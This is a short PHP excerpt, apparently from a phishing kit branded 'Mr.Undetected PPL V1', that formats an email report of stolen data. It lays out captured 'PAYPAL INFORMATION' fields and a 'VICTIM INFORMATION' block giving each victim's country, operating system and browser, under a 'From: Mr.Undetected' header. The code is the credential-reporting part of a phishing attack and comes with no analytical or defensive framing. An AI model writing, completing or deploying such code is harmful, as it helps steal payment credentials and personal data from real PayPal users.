...
$headers .= "From: Mr.Undetected" . "\r\n";
    ...
    $x .= "✘±±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>PAYPAL INFORMATION</font> ]±±±±±±±±±±±±±±±±±±✘<br>";
    foreach ($info as $MName => $MValue) 
    {$x .= "<b>|$MName---------: ".$MValue."</b><br>";       
    }
    $x .= "✘±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIM INFORMATION</font> ]±±±±±±±±±±±±±±±±±✘<br>";
    $x .= "<b>|From-----: ".getCountry($info)."<br>";
    $x .= "<b>|OS-----: ".getpcOS($_SERVER['HTTP_USER_AGENT'])."<br>";
    $x .= "<b>|Browser-----: ".getpcBrowser($_SERVER['HTTP_USER_AGENT'])."</b><br>";
    $x .= "✘±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>Mr.Undetected PPL V1</font> ]±±±±±±±±±±±±±±±±±✘<br>";
